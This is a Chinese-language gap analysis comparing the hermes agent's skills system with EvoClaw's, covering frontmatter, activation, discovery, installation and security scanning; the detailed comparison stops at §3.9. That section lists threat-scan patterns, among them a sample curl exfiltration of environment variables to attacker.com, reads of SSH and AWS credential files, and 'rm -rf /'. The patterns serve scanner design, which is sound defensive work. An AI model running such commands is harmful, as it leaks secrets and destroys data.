# 12 — Skills 系统 差距分析

> **对标研究**: `/Users/mac/src/github/hermes-agent/.research/12-skills-system.md`（1191 行，Phase C1 / 基线 `00ff9a26`）
> **hermes 基线**: `skills/` 26 目录 + `optional-skills/` 13 目录 + `tools/skills_*.py` / `agent/skill_*.py` / `hermes_cli/skills_hub.py` / `tools/skills_guard.py`
> **EvoClaw 基线**: 分支 `feat/hermes-parity` @ `9f74694`（2026-04-16），`packages/core/src/skill/*.ts` 8 文件 + `packages/core/src/skill/bundled/` 30 个 bundled 技能 + `packages/core/src/context/plugins/tool-registry.ts`（Tier 1 注入） + `packages/core/src/mcp/mcp-prompt-bridge.ts`（MCP 桥接） + `packages/core/src/extension-pack/pack-parser.ts`（企业扩展包）
> **综合判定**: 🟢 **EvoClaw 显著反超**（生态来源、注入模型、执行模式、模型降级、MCP 桥接、企业扩展包维度全面领先；hermes 仅在 manifest 级用户编辑保护、Hub 信任分级、威胁扫描规则库、agent 自主创建 4 维度占优）

**档位图例**:
- 🔴 **EvoClaw 明显落后** — 能力缺失或显著薄弱，补齐需 ≥1 人周工作量
- 🟡 **部分覆盖 / 形态差异** — 能力存在但不完整，或两者架构取向不同各有优劣
- 🟢 **EvoClaw 对齐或反超** — 能力持平或 EvoClaw 表现更佳

---

## 1. 定位

**hermes Skills 系统**（`skills/` + `optional-skills/` + `agent/skill_commands.py` ~400 行 + `tools/skills_sync.py` ~300 行 + `tools/skill_manager_tool.py` ~700 行 + `tools/skills_hub.py` / `hermes_cli/skills_hub.py` / `tools/skills_guard.py`） — skill 定位为"程序性记忆"，按 [agentskills.io](https://agentskills.io) 开放标准存 markdown 文件。**激活方式是 user message 注入**（CLI 里用户输入 `/skill-name`），而不是 system prompt 目录。核心差异化能力是 **manifest v2 MD5 用户修改检测 + 4 档信任级别安装策略矩阵 + agent 自主创建（5+ tool-call / 错误恢复 / 用户修正时 LLM 主动调 `skill_manage(action=create)`） + GitHub App JWT Hub 集成**。

**EvoClaw Skills 系统**（`packages/core/src/skill/` 8 个 TS 文件 + `bundled/` 30 个内置技能 + `tool-registry.ts` 415 行 Tier 1 注入插件 + `mcp-prompt-bridge.ts` MCP 桥接 + `extension-pack/` 3 个企业扩展包文件） — skill 定位为**工具增强包 / 多步工作流模板**，**激活方式是 system prompt 目录 + `invoke_skill` 工具**（CLAUDE.md 的"Tier 1 XML 注入 + Tier 2 按需加载"两级模型）。核心差异化能力是 **5 种来源（bundled/local/clawhub/github/mcp）+ inline/fork 双执行模式 + `model:` 字段 fork 降级 + 企业扩展包 `evoclaw-pack.json` manifest + 统一 NameSecurityPolicy（allowlist/denylist/disabled）覆盖 Skills + MCP**。

**规模对比**: 两者都是"专业领域指导手册"载体。hermes 的 wheel 内 bundled skill 覆盖面更广（26 顶层分类 `apple/` `research/` `devops/` ... + 13 optional 分类），EvoClaw 的 30 个 bundled skill 覆盖面偏企业场景（`deep-research-pro` / `word-docx` / `powerpoint-pptx` / `stock-watcher` / `skill-vetter` 等）。核心**设计取向**：hermes 把 skill 当作"用户显式激活的命令"（`/arxiv search ML` 即发 user message），EvoClaw 把 skill 当作"模型按需发现的工具库"（system prompt XML 目录 + LLM 自主调 `invoke_skill`）。

---

## 2. 档位速览（对应 §3 深度对比）

| # | 机制 | 档位 | 一句话 |
|---|---|---|---|
| §3.1 | SKILL.md 规范与 YAML frontmatter | 🟡 | 字段集同构但语义不同；EvoClaw 独有 `execution-mode` / `whenToUse` / `model` / `argument-hint` / `arguments` 5 字段，hermes 独有 `metadata.hermes.platforms` / `config` / `setup.collect_secrets` 3 字段 |
| §3.2 | 激活模型（user message vs system prompt） | 🟡 | hermes user message（硬约束不碰 system）vs EvoClaw Tier 1 XML + invoke_skill 工具，**根本设计取向差异** |
| §3.3 | 发现机制（filesystem scan） | 🟡 | hermes `rglob SKILL.md` + 跳过 `.git/.github/.hub/` + platform 过滤 vs EvoClaw 三级目录递归扫描（agent → user → bundled）+ gate 过滤，两者都缺对方特性 |
| §3.4 | 来源（bundled/local/clawhub/github/mcp/agent-created） | 🟢 | **反超**：EvoClaw 5 种来源 + MCP prompts 桥接，hermes 4 种（builtin/用户外部目录/GitHub taps/agent-created），缺 MCP 整合 |
| §3.5 | 注入策略（Tier 1 XML + Tier 2 按需） | 🟢 | **反超**：EvoClaw 完整 2 级渐进式 + bundled 豁免 + 紧凑模式自动降级，hermes `skills_list` + `skill_view` 是"agent 调工具"而非"自动注入" |
| §3.6 | 执行模式（inline vs fork） | 🟢 | **反超**：EvoClaw `inline` / `fork` 双模式（SKILL.md `execution-mode: fork` 或调用时 `mode: "fork"` 覆盖），hermes 无执行模式分离概念 |
| §3.7 | Skill 与工具的关系 | 🟢 | 对齐：两者都"不让 skill 注册新工具"，只通过指令引导模型用已有工具；EvoClaw 通过 `invoke_skill` 统一入口更干净 |
| §3.8 | 安装/下载流程 | 🟡 | hermes GitHub API + 4 级认证 + index-cache TTL 3600s + `_resolve_trust_level` vs EvoClaw 两步 prepare→confirm + ClawHub ZIP + GitHub `git clone --depth 1` + 临时目录 + 静态扫描，各有强项 |
| §3.9 | 安全策略（allowlist / denylist / 威胁扫描） | 🟡 | hermes `skills_guard.py` 8 类威胁模式 + INSTALL_POLICY 4x3 矩阵（trust × verdict） vs EvoClaw `NameSecurityPolicy`（allowlist/denylist/disabled）+ `analyzeSkillSecurity` 6 类正则，EvoClaw 无 trust 分级，hermes 无 allowlist 名单过滤 |
| §3.10 | 用户修改保护（manifest v2 MD5） | 🔴 | EvoClaw **完全缺失**：bundled 技能是编译到包内的静态资源，用户无法编辑本地副本（也就不需要 MD5 保护），但 Hub/GitHub 装入 `~/.evoclaw/skills/` 的技能在未来更新时会直接覆盖用户编辑（目前无更新流程） |
| §3.11 | 更新/删除/版本管理 | 🔴 | EvoClaw 无"更新"流程（只能卸载+重装）、无 `version` 字段比对、无回滚，hermes 也无业务层更新但 manifest v2 是基础设施 |
| §3.12 | MCP Prompt 桥接 | 🟢 | **反超**：EvoClaw 独有 `bridgeAllMcpPrompts()` 自动把 MCP 服务器 prompts 注册为 `mcp:{server}:{prompt}` 技能，hermes 无 |
| §3.13 | 企业扩展包 / 一键安装 | 🟢 | **反超**：EvoClaw `evoclaw-pack.json` manifest + `skills/` 子目录 ZIP + 安全策略合并 + pack-installer，hermes 无 |
| §3.14 | 门控（requires.bins/env/os） | 🟢 | **反超**：EvoClaw `checkGates()` 实现 bins / env / os 三类门控，规范声称 AgentSkills 不定义此字段为 EvoClaw 自定义扩展；hermes 仅 `platforms` OS 过滤，无 bin/env |
| §3.15 | Agent 自主创建 skill | 🔴 | EvoClaw **完全缺失**：无 `skill_manage(action=create)` 工具，无 5+ tool-call/错误恢复/用户修正的自主创建触发机制；有 `skill-creator` bundled skill 但那是给用户看的"指南"不是 agent 自主创建 |
| §3.16 | 模型降级（fork 时使用 skill 声明的 model） | 🟢 | **反超**：EvoClaw 独有 `SKILL.md` 可声明 `model: provider/modelId`，fork 执行时优先使用该模型，未配置则静默降级，hermes 无此概念 |

**统计**: 🔴 3 / 🟡 5 / 🟢 8。综合判定：**EvoClaw 显著反超**（8 项反超 vs 3 项落后 vs 5 项形态差异）。

---

## 3. 机制逐条深度对比

每条同时给出 **hermes 实现**（带源码行号）+ **EvoClaw 实现**（带源码行号）+ **判定与分析**。

### §3.1 SKILL.md 规范与 YAML frontmatter

**hermes**（`skills/research/arxiv/SKILL.md:1-11` + `.research/12-skills-system.md §3.1`）:

```yaml
---
name: arxiv
description: Search and retrieve academic papers from arXiv...
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [Research, Arxiv, Papers, Academic, Science, API]
    related_skills: [ocr-and-documents]
    config:
      - key: arxiv_results_limit
        description: Default number of results per search
        default: 10
        prompt: How many arxiv results per search?
    platforms: [darwin, linux]
---
```

字段集: `name` / `description` / `version` / `author` / `license` / `metadata.hermes.{tags, related_skills, config, platforms, setup.collect_secrets}`。

支持目录: `references/` / `templates/` / `scripts/` / `assets/`（`.research/12-skills-system.md §3.1` "辅助文件"）。

**EvoClaw**（`packages/shared/src/types/skill.ts:2-47`，`packages/core/src/skill/skill-parser.ts:139-183`）:

```yaml
---
name: skill-creator
description: Guide for creating effective skills...
whenToUse: "User wants to create a new skill or update an existing skill"
execution-mode: fork           # EvoClaw 独有
model: anthropic/claude-opus   # EvoClaw 独有
argument-hint: "month=4 week=1"  # EvoClaw 独有
arguments: [month, week]       # EvoClaw 独有
allowed-tools: [Read, Grep]    # 仅 fork 模式消费
requires:
  bins: [pandoc]               # EvoClaw 独有
  env: [OPENAI_API_KEY]
  os: [darwin, linux]
disable-model-invocation: false
---
```

`skill-parser.ts:139-183` 解析后映射到 `SkillMetadata` 的完整字段集（`name` / `description` / `version` / `author` / `compatibility` / `allowedTools` / `disableModelInvocation` / `requires.{bins,env,os}` / `executionMode` / `whenToUse` / `model` / `argumentHint` / `arguments`）。

**判定 🟡**:
- 🟢 EvoClaw 独有 5 字段：`execution-mode`（见 §3.6） / `whenToUse` / `model`（见 §3.16） / `argument-hint` / `arguments`（详见 `skill-parser.ts:156-172`）
- 🔴 hermes 独有 3 字段：`metadata.hermes.platforms`（EvoClaw 用平铺 `requires.os` 替代）/ `metadata.hermes.config`（skill 级用户配置收集，EvoClaw 无此能力）/ `metadata.hermes.setup.collect_secrets`（hermes setup 向导收集到 `~/.hermes/.env`，EvoClaw 无此流程）
- 🔴 EvoClaw 未实现 `references/` / `templates/` / `scripts/` / `assets/` 支持文件列出机制（`skill-tool.ts:106-148` 的 inline 模式只返回 `body`，不列出目录下辅助文件）
- 两侧都用 `---` 围栏 + YAML 解析（hermes `skill_utils.py:52-86` CSafeLoader，EvoClaw `skill-parser.ts:56-186` 手写简化 YAML 避免引入 yaml 依赖）

---

### §3.2 激活模型（user message vs system prompt）

**hermes**（`.research/12-skills-system.md §3.3 _build_skill_message()` L121-197 + `.research/07-prompt-system.md §3.9`）— skill 注入为 **user message**，是**硬约束**（引用原文 "skill 内容作为 **user message**——不是 system prompt"）:

```python
# 用户输入 /arxiv search machine learning
# → HermesCLI.process_command 解析 → "/arxiv"
# → build_skill_invocation_message("arxiv", "search machine learning")
# → user message: "[SYSTEM: user invoked skill arxiv]
#                   # arxiv
#                   <skill body>
#                   Support files available: ...
#                   [User instructions: search machine learning]"
# → AIAgent.run_conversation(user_message_content)
```

特点:
- 触发：**用户显式** `/skill-name` 命令
- 位置：user message（不触发 system prompt cache 失效）
- 生效范围：一次对话内该 message 可见

**EvoClaw**（`packages/core/src/context/plugins/tool-registry.ts:118-176` beforeTurn + `packages/core/src/skill/skill-tool.ts:106-148` invoke_skill）— **两级**注入:

```typescript
// Tier 1: system prompt 注入 XML 目录（tool-registry.ts:171）
async beforeTurn(ctx: TurnContext) {
  // ... 扫描 + 过滤 + 安全策略
  const catalog = buildSkillsPrompt(activeSkills);
  ctx.injectedContext.push(catalog);   // → <available_skills>...</available_skills>
  ctx.estimatedTokens += activeSkills.length * 75;
}

// Tier 2: 模型调 invoke_skill 工具按需加载完整 SKILL.md（skill-tool.ts:106-148）
async call(input) {
  const parsed = parseSkillMd(skillMdContent);
  // inline 模式：返回 body 注入当前轮次
  return { content: `# Skill: ${parsed.metadata.name}\n> ...\n\n${body}` };
}
```

特点:
- 触发：**LLM 主动**调 `invoke_skill` 工具（也可用户给出 hint）
- 位置：Tier 1 在 system prompt；Tier 2 在 tool_result message
- 生效范围：Tier 1 每轮注入（存在性），Tier 2 单次 tool_use 注入（完整指令）

**判定 🟡**：**根本设计取向差异**:
- hermes 模式：**用户主导**（用户先看 `hermes skills list`，再用 `/skill-name` 激活，不污染 system prompt cache）
- EvoClaw 模式：**模型主导**（LLM 看到 system prompt 目录后自主选择，适合"agent 按需发现工具"的 autonomous 语义）
- 取向差异下两者无法简单对比优劣；但 hermes 的用户主导对"不想让 LLM 自主乱调技能"场景更安全，EvoClaw 的模型主导对"企业用户不懂技能库，靠 agent 自动发现"场景更友好（与 CLAUDE.md "面向非程序员企业用户" 定位一致）。
- 🟡 未来 EvoClaw 可加"用户显式激活"入口（例如前端命令面板），与 Tier 1/Tier 2 自动注入共存

---

### §3.3 发现机制（filesystem scan）

**hermes**（`.research/12-skills-system.md §3.3 scan_skill_commands()` L200-262）:

```python
def scan_skill_commands() -> Dict[str, SkillCommandDef]:
    skill_dirs = [get_hermes_home() / "skills"]
    skill_dirs.extend(get_external_skills_dirs())   # config.yaml: skills.external_dirs

    disabled = _get_disabled_skill_names()

    for root in skill_dirs:
        for skill_md in root.rglob("SKILL.md"):
            parts = skill_md.parts
            if any(p in (".git", ".github", ".hub") for p in parts):
                continue                             # 跳过 git/CI/hub 子目录

            frontmatter, body = parse_frontmatter(skill_md.read_text())
            if not frontmatter: continue

            name = frontmatter.get("name")
            if not name or name in disabled: continue

            if not skill_matches_platform(frontmatter.get("platforms", [])):
                continue                             # 按 platforms 字段过滤

            command_key = _normalize_command_name(name)  # "Web Research" → "web-research"
            commands[command_key] = SkillCommandDef(...)
```

5 条规则：rglob SKILL.md / 跳过 `.git/.github/.hub/` / disabled 过滤 / platforms 过滤 / 命令名规范化。

**EvoClaw**（`packages/core/src/context/plugins/tool-registry.ts:190-238`）:

```typescript
function scanSkills(agentId: string, paths: SkillPaths): InstalledSkill[] {
  const skills: InstalledSkill[] = [];
  const seen = new Set<string>();

  // Agent 工作区优先（覆盖同名）
  scanDir(paths.agentDirTemplate.replace('{agentId}', agentId), skills, seen, 'local');
  // 用户级安装
  scanDir(paths.userDir, skills, seen, 'local');
  // Bundled（最低优先级）
  scanDir(paths.bundledDir, skills, seen, 'bundled');

  return skills;
}

function scanDir(dirPath, skills, seen, source) {
  // 子目录 → 查找 SKILL.md；根目录 .md 文件也视为 Skill
  for (const entry of entries) {
    if (entry.isDirectory()) {
      const skillMdPath = path.join(fullPath, 'SKILL.md');
      const skill = tryLoadSkill(skillMdPath, fullPath, source);
      if (skill && !seen.has(skill.name)) { seen.add(skill.name); skills.push(skill); }
    } else if (entry.isFile() && entry.name.endsWith('.md') && !entry.name.startsWith('.')) {
      // 根目录 .md 文件直接作为 Skill（skill-discoverer.ts:205-217 也有此逻辑）
    }
  }
}
```

特点:
- **三级目录优先级**：agent workspace → user → bundled（同名按此顺序覆盖，见 L194-202 注释 "Agent 工作区优先 / 用户级 / Bundled（最低优先级 — 用户/Agent 同名技能覆盖 bundled）"）
- **不递归扫描**（只扫 `<basedir>/<skillname>/SKILL.md` 一层，不 rglob）
- **无 `.git/.github/` 跳过逻辑**（EvoClaw 的 skills 目录结构扁平，一层即 skill 名，不含 git 子目录风险）
- **无 disabled 过滤**（通过 `getDisabledSkills?.(agentId)` 回调在 beforeTurn 过滤，不在扫描阶段）

**判定 🟡**:
- 🟢 EvoClaw 有 bundled + user + agent 三级覆盖优先级，hermes 只有 external_dirs + default 两级
- 🔴 EvoClaw 不递归扫描（不支持 `skills/research/arxiv/SKILL.md` 这种分类目录的深层布局），只支持 `<skillsdir>/<skillname>/SKILL.md` 或 `<skillsdir>/<filename>.md` 两种扁平布局
- 🔴 EvoClaw 无命令名规范化（技能名直接就是目录名，没有"空格→连字符"规则）
- 🟢 EvoClaw 统一通过 `checkGates()`（os 平台过滤包含在内，见 §3.14）处理跨平台，设计更通用

---

### §3.4 来源（bundled/local/clawhub/github/mcp/agent-created）

**hermes**（`.research/12-skills-system.md §3.7 SkillSource` + `.research/12-skills-system.md §2`）:

4 种来源 + 4 档信任:

```python
# tools/skills_hub.py
class GitHubSource(SkillSource):
    DEFAULT_TAPS = [
        "openai/skills",
        "anthropics/skills",
        "VoltAgent/awesome-agent-skills",
        "garrytan/gstack",
    ]

# .research/12-skills-system.md §3.8 trust level
# builtin / trusted / community / agent-created
```

- **builtin** — `skills/` 自家目录 wheel 打包
- **external_dirs** — 用户在 `config.yaml.skills.external_dirs` 配置的目录
- **GitHub taps** — `agentskills.io` 分发，通过 GitHub API 拉取
- **agent-created** — LLM 调 `skill_manage(action='create')` 生成

**EvoClaw**（`packages/shared/src/types/skill.ts:60` + `packages/core/src/context/plugins/tool-registry.ts:189-205` + `packages/core/src/skill/skill-discoverer.ts:62-187` + `packages/core/src/mcp/mcp-prompt-bridge.ts:23-43`）:

5 种来源:

```typescript
export type SkillSource = 'clawhub' | 'github' | 'local' | 'bundled' | 'mcp';
```

- **bundled** — `packages/core/src/skill/bundled/` 30 个预置技能（`agent-browser-clawdbot` / `deep-research-pro` / `word-docx` / `powerpoint-pptx` / `skill-creator` / `skill-finder-cn` / `skill-vetter` / `stock-watcher` / `proactive-agent` 等，见 `skill/bundled/` 目录）
- **local** — 用户级 `~/.evoclaw/skills/` + Agent 级 `<workspace>/agents/<id>/workspace/skills/`
- **clawhub** — `https://clawhub.ai/api/v1/download?slug=&version=` ZIP 下载（`skill-installer.ts:146-164`）+ `lightmake.site/api/skills` 浏览（`skill-discoverer.ts:25,96`）
- **github** — `git clone --depth 1` 或完整 URL（`skill-installer.ts:168-197`）
- **mcp** — `mcp-prompt-bridge.ts:23-36` 将 MCP 服务器 prompts 自动注册为 `mcp:{serverName}:{promptName}` 技能（见 §3.12）

无 agent-created 来源（见 §3.15）。

**判定 🟢 反超**:
- EvoClaw 5 种来源覆盖面 > hermes 4 种
- 🟢 独有 **MCP prompts 桥接**（hermes 单独的 `skills/mcp/` 是给 MCP 工具写的"使用指南"，**不是** MCP prompts 自动桥接，见 `.research/12-skills-system.md §7 延伸阅读` "一些 skill 是为 MCP 工具写的使用指南"）
- 🟢 bundled 集成到包内编译产物（无需网络 / 零依赖启动），hermes 走 wheel + skills_sync 同步到 `~/.hermes/skills/` 运行时需要同步步骤
- 🔴 缺 agent-created（见 §3.15 详述）

---

### §3.5 注入策略（Tier 1 XML + Tier 2 按需）

**hermes** — 无"自动注入目录"概念:

从 `.research/12-skills-system.md §3.6`：
- `skills_list` 工具返回元数据列表（agent 主动调才能看到）
- `skill_view` 工具加载完整 SKILL.md + 支持文件列表（tier 2-3）

即 hermes 的"progressive disclosure"是**工具级**（agent 调工具），不是**prompt 级**（自动注入 system prompt）。

**EvoClaw**（`packages/core/src/context/plugins/tool-registry.ts:288-386 buildSkillsPrompt()`）— 完整 2 级注入 + 降级矩阵:

```typescript
const MAX_SKILLS_IN_PROMPT = 150;          // L40
const MAX_SKILLS_PROMPT_CHARS = 30000;     // L43

function buildSkillsPrompt(skills: InstalledSkill[]): string {
  const header = `## Skills (optional reference library)
Built-in tools are your primary action interface — prefer them for any direct action you can do yourself.
Skills are pre-written task templates for *complex multi-step workflows* that no single built-in tool can complete on its own.
Only invoke a skill when all of the following hold: ...
Constraint: invoke at most one skill per turn.`;

  // 先尝试完整模式
  const fullEntries = skills.map(skillToFullEntry);
  const fullCatalog = `<available_skills>\n${fullEntries.join('\n')}\n</available_skills>`;
  if (fullCatalog.length <= MAX_SKILLS_PROMPT_CHARS) return header + fullCatalog;

  // G1 bundled 豁免：bundled 始终 full 模式
  const bundled = skills.filter(s => s.source === 'bundled');
  const others = skills.filter(s => s.source !== 'bundled');
  // ... 剩余预算计算 + others compact 降级 + 按比例截断
}

function skillToFullEntry(s: InstalledSkill): string {
  const modeTag = s.executionMode === 'fork' ? '\n    <mode>fork</mode>' : '';
  const whenTag = s.whenToUse ? `\n    <when>${escapeXml(s.whenToUse)}</when>` : '';
  const hintTag = s.argumentHint ? `\n    <argument-hint>${escapeXml(s.argumentHint)}</argument-hint>` : '';
  const argNamesTag = s.arguments?.length
    ? `\n    <arguments>${s.arguments.map(escapeXml).join(', ')}</arguments>` : '';
  return `  <skill>
    <name>${escapeXml(s.name)}</name>
    <description>${escapeXml(s.description)}</description>${whenTag}${hintTag}${argNamesTag}${modeTag}
  </skill>`;
}
```

注入格式:
- Tier 1 **完整模式**：`<skill><name>X</name><description>...</description><when>...</when><argument-hint>...</argument-hint><mode>fork</mode></skill>` ~50-100 tokens/skill（CLAUDE.md 口径）
- Tier 1 **紧凑模式**：`<skill><name>X</name></skill>`（触发条件：整体 prompt 超 30K chars）
- Tier 2：LLM 调 `invoke_skill({ skill: "name", args: "..." })` 加载完整 body

**判定 🟢 反超**:
- 完整 2 级渐进式，hermes 只有工具级 progressive disclosure
- **bundled 豁免**（L313-315 `bundled 享有截断豁免`）保证预置技能永远可见
- **紧凑模式自动降级**（两级 30K chars 阈值，超过自动只留 name）
- **XML 子节点引导精准触发**（`<when>` / `<argument-hint>` / `<arguments>` / `<mode>` 4 种 tag 指导模型）
- 🔴 但 EvoClaw 没有 hermes 的 `skills_list` / `skill_view` 主动查询路径（Tier 1 已自动注入覆盖了用例）

---

### §3.6 执行模式（inline vs fork）

**hermes** — 无执行模式概念。skill 注入为 user message 后就是在**主会话**里继续跑，没有"独立子代理"分离选项。（可用 `spawn_agent` / `delegate_task` 子代理，但那是工具级，不是 skill 级）

**EvoClaw**（`packages/shared/src/types/skill.ts:63` + `packages/core/src/skill/skill-tool.ts:137-143` + `packages/core/src/skill/skill-fork-executor.ts:52-160`）:

```typescript
// types/skill.ts:63
export type SkillExecutionMode = 'inline' | 'fork';

// skill-tool.ts:137-143
const effectiveMode = modeOverride ?? parsed.metadata.executionMode ?? 'inline';
if (effectiveMode === 'fork' && options?.forkConfig?.enabled) {
  return handleForkExecution(skillName, body, parsed.metadata.description,
    args, options.forkConfig, parsed.metadata.model, options.modelResolver);
}
// Inline 模式（默认）
return { content: header + body };

// skill-fork-executor.ts:49-159
const MAX_FORK_TURNS = 20;
export async function forkExecuteSkill(params) {
  // 构建独立 systemPrompt + userMessage
  // 直接调 LLM API（Anthropic Messages 或 OpenAI Chat Completions）
  // 返回 { result, tokenUsage, isError }
}
```

**判定 🟢 反超**：
- EvoClaw 独有 **inline / fork 双模式**：
  - `inline`（默认）：指令注入当前上下文，污染主对话 token 预算
  - `fork`：独立子代理执行，仅返回结果摘要到主对话，**防止污染主对话上下文**
- 触发优先级：`mode` 参数（调用时覆盖）> SKILL.md `execution-mode` 声明 > 默认 inline
- 安全措施（`skill-fork-executor.ts:9-11 注释`）: 子代理不包含 `invoke_skill` 工具（防递归 fork）+ `MAX_FORK_TURNS = 20` 硬限制 + `AbortSignal` 取消支持
- 对"代码审查 / 深度研究 / 安全扫描"等**复杂多步技能**特别有价值，hermes 需要用户手动用 `delegate_task` 达成类似效果
- 注意：当前 fork 实现是单轮 LLM 调用（`skill-fork-executor.ts:56 注释` "简化实现 ... 后续可升级为完整 queryLoop"）— 未来可升级为完整 queryLoop

---

### §3.7 Skill 与工具的关系

**hermes** — skill 不注册新工具（`.research/12-skills-system.md §1` "skill = 程序性记忆"，skill 内容就是 markdown 指令，引导 agent 使用已有工具）

**EvoClaw**（CLAUDE.md L79 "Skill 不注册新工具，通过指令引导模型使用已有工具" + `packages/core/src/skill/skill-tool.ts:146-147` inline 模式只返回 body 文本）:

```typescript
// Inline 模式（默认）
const header = `# Skill: ${parsed.metadata.name}\n> ${parsed.metadata.description}\n\n`;
return { content: header + body };
```

无"skill 工具注册"逻辑。

**判定 🟢 对齐**：两者都严格遵守"skill 不注册新工具"原则。EvoClaw 略微更干净——统一通过 `invoke_skill` 工具作为入口（`skill-tool.ts:64` `createSkillTool`），hermes 是多个专用工具（`skills_list` / `skill_view` / `skill_manage`）。

---

### §3.8 安装/下载流程

**hermes**（`.research/12-skills-system.md §3.7 GitHub App JWT 流程` L203-245 + `§3.2 skills_sync.py`）:

安装链路（针对 Hub 来源）:
1. **GitHub 认证 4 级**（优先级）: `GITHUB_TOKEN / GH_TOKEN` → `gh auth token` subprocess → GitHub App JWT（RS256，10min 有效 → 换 installation token ~1h）→ 匿名（60 req/hr）
2. **Index cache** `skills/index-cache/*.json` TTL 3600s，减少 GitHub API 调用
3. **trust level** 解析：`openai/skills` / `anthropics/skills` → `trusted`，其他 → `community`
4. **skills_guard 扫描**（见 §3.9）
5. **INSTALL_POLICY** 决策矩阵判定（trust × verdict）
6. 写入 `~/.hermes/skills/community/<name>/`

hermes 还有 `skills_sync.py` 的 **bundled → `~/.hermes/skills/`** 初始同步（见 §3.10）。

**EvoClaw**（`packages/core/src/skill/skill-installer.ts:27-144`）:

两步交互式安装（prepare → confirm）:

```typescript
export class SkillInstaller {
  async prepare(source: SkillSource, identifier: string, version?: string): Promise<SkillPrepareResult> {
    // 1. 下载到临时目录
    if (source === 'clawhub') {
      await this.downloadFromClawHub(identifier, tempDir, version);   // GET /api/v1/download?slug=&version=
    } else if (source === 'github') {
      await this.downloadFromGitHub(identifier, tempDir);              // git clone --depth 1
    }
    // 2. 找 SKILL.md
    const skillMdPath = this.findSkillMd(tempDir);
    // 3. 解析 metadata + 静态安全扫描 + 门控检查
    const parsed = parseSkillMd(content);
    const securityReport = analyzeSkillSecurity(tempDir);
    const gateResults = checkGates(parsed.metadata);
    // 4. 返回 PrepareResult（含 prepareId UUID）给前端
    pendingInstalls.set(prepareId, result);
    return result;
  }

  confirm(prepareId: string, agentId?: string): string {
    const pending = pendingInstalls.get(prepareId);
    if (pending.securityReport.riskLevel === 'high') {
      this.cleanupDir(pending.tempPath);
      throw new Error('安全分析显示高风险，拒绝安装');
    }
    // 5. 移动临时目录到目标（用户级或 agent 级）
    fs.renameSync(pending.tempPath, targetDir);
    return targetDir;
  }
}
```

- **ClawHub**: `https://clawhub.ai/api/v1/download?slug=&version=` ZIP 下载 + `unzip -o -q`
- **GitHub**: `git clone --depth 1` 或完整 URL（不支持 GitHub API / ZIP / gh CLI）
- **两步交互式** prepare→confirm（`prepareId` UUID 持有临时目录，前端看到安全报告+门控结果再决定 confirm/cancel）
- **自动拒绝 high risk**（`skill-installer.ts:102-105`）

**判定 🟡**:
- 🔴 EvoClaw 无 GitHub 认证分级（全匿名或用户 git 凭据，可能遇到 60 req/hr 限制）
- 🔴 EvoClaw 无 index cache（每次搜索都直接打 `lightmake.site`，但有 `skill-discoverer.ts:31` `CACHE_TTL_MS = 5 * 60 * 1000` 进程内 5min 搜索缓存）
- 🟢 EvoClaw 两步 prepare→confirm 交互式安装对非技术用户更友好（hermes 是 CLI `hermes skills install` 一步）
- 🟢 EvoClaw 支持 agent 级 vs 用户级双安装范围（`skill-installer.ts:108-110` `targetDir = agentId ? ... : ...`），hermes 只有用户级
- 🟢 EvoClaw 独有 **high risk 自动拒绝**（hermes 对 `community` + `dangerous` 是 "block" 无 risk level 绑定的拒绝路径）

---

### §3.9 安全策略（allowlist / denylist / 威胁扫描）

**hermes**（`.research/12-skills-system.md §3.8 tools/skills_guard.py`）:

8 类威胁模式 + 4x3 INSTALL_POLICY 矩阵:

```python
# 威胁类别（部分示例）
Exfiltration: curl -X POST -d "$(env)" https://attacker.com
Keystore access: cat ~/.ssh/id_rsa, cat ~/.aws/credentials
File reading: cat .env, cat .netrc
Env dump: env, printenv, process.env, os.environ
DNS tunneling
Injection: eval, exec, deserialization
Destructive: rm -rf /, git reset --hard
Persistence: Cron entries, systemd units
Obfuscation: Base64 hex encoding

# INSTALL_POLICY L41-49
                safe      caution    dangerous
builtin         allow     allow      allow
trusted         allow     allow      block
community       allow     block      block
agent-created   allow     allow      ask
```

**EvoClaw**（`packages/core/src/skill/skill-analyzer.ts:19-26` + `packages/core/src/security/extension-security.ts:15-71`）:

```typescript
// skill-analyzer.ts:19-26 — 危险模式 6 类
const DANGER_PATTERNS: DangerPattern[] = [
  { type: 'eval', pattern: /\beval\s*\(/, severity: 'high' },
  { type: 'function_constructor', pattern: /new\s+Function\s*\(/, severity: 'high' },
  { type: 'shell_exec', pattern: /\b(?:exec|execSync|spawn|spawnSync)\s*\(/, severity: 'medium' },
  { type: 'fetch', pattern: /\bfetch\s*\(\s*['"`]https?:\/\//, severity: 'medium' },
  { type: 'fs_write', pattern: /\bfs\s*\.\s*(?:writeFile|writeFileSync|appendFile|...)/, severity: 'medium' },
  { type: 'env_access', pattern: /process\s*\.\s*env\s*\[/, severity: 'low' },
];

// extension-security.ts:15-36 — 统一 NameSecurityPolicy 评估
export function evaluateAccess(name: string, policy: NameSecurityPolicy): SecurityDecision {
  if (policy.denylist?.includes(name)) return 'denied_by_denylist';   // 1. denylist 绝对优先
  if (policy.disabled?.includes(name)) return 'disabled';             // 2. disabled 检查
  if (policy.allowlist && !policy.allowlist.includes(name)) return 'denied_by_allowlist';
  return 'allowed';
}
```

两套机制各自运作：
- **静态扫描**（`analyzeSkillSecurity`）在**安装时**运行（`skill-installer.ts:65` `prepare()` 内部调用），决定 high/medium/low 风险标签
- **NameSecurityPolicy**（`extension-security.ts`）在**运行时**生效（`tool-registry.ts:142-149` beforeTurn 里 `filterByPolicy(activeSkills, s => s.name, opts.securityPolicy)`），根据 IT 管理员配置的白/黑名单过滤技能

**判定 🟡**:
- 🔴 EvoClaw 的 `DANGER_PATTERNS` 只有 **6 类正则**，hermes 有 **8 大类威胁模式库**（keystore / exfiltration / DNS tunneling / persistence 等 EvoClaw 未覆盖）
- 🔴 EvoClaw 无 **trust level 分级**（builtin / trusted / community / agent-created），所有 skill 走同一份 `DANGER_PATTERNS`
- 🔴 EvoClaw 无 **INSTALL_POLICY 决策矩阵**（trust × verdict 的 12 格策略），只有"high 拒绝 / medium 警告 / low 通过"三档平铺
- 🟢 EvoClaw 独有 **allowlist / denylist / disabled 的企业级安全策略**（CLAUDE.md "统一 NameSecurityPolicy 覆盖 Skills + MCP Servers，denylist 绝对优先"），hermes 只有 `skills.disabled` 全局/per-platform 禁用清单
- 🟢 EvoClaw 统一 `NameSecurityPolicy` 同时覆盖 Skills + MCP Servers（`mergeSecurityPolicies`），hermes 的 skills_guard 只管 skill 不管 MCP
- 🟢 `mergeSecurityPolicies` 支持企业扩展包合并（denylist 并集 / allowlist 交集 / disabled 并集），对"IT 管理员全局策略 + 扩展包自带策略"场景友好
